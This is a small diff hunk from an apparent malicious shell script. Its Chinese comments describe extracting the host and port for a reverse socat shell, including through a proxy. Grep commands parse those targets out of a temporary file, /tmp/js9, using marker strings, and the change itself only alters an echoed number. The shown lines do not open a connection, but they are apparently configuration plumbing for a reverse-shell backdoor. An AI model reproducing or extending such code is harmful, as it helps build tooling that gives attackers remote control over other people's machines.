@@ -85,7 +85,7 @@ ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9;echo 456891 >/d
 port5=${ip_port5#*:};
 ip5=${ip_port5%:*};
 # 提取反弹socat的主机和端口，支持代理(ip7)
-ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456891 >/dev/null);
+ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456892 >/dev/null);
 echo "flag_9832";
 port7pxy=${ip_port7pxy#*:};
 ip7pxy=${ip_port7pxy%:*};
